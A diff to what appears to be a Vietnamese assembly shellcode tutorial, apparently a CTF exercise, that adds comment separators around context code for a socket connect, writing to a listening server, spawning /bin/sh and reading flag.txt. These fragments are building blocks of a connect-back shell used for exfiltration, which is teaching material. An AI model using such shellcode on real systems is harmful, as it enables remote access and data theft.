@@ -108,6 +108,7 @@ _start:
 	mov rax, 42 ; syscall của connect()
 	syscall
 
+	; ######################################
 	; // write random bs
 	; write(int fd, const void *buf, size_t count)
 	mov rax, 0x01 ; syscall cho write()
@@ -158,6 +159,8 @@ _start:
     mov rdx, 16          ; size
     syscall
 
+	; ///////////////////////////////////////
+
     ; write() viết ra server đang listening
     mov rax, 1           ; sys_write
     mov rdi, rbx         ; sockfd
@@ -195,6 +198,9 @@ Chạy:
 
 Assembly code:
 ```asm
+	; // van giu code ket noi socket o tren 
+	; ///////////////////////////////////////
+
 	; spawn shell
 	; shel: /bin/sh - 2F 62 69 6E 2F 73 68 - 0x68732f6e69622f
 	mov rbx, 0x68732f6e69622f
@@ -234,6 +240,9 @@ Output:
 
 Assembly code:
 ```asm
+	; // van giu code ket noi socket o tren 
+	; ///////////////////////////////////////
+
 	; file flag.txt
     mov rbx, 0 ; '\0' - null terminator cho flag
     push rbx
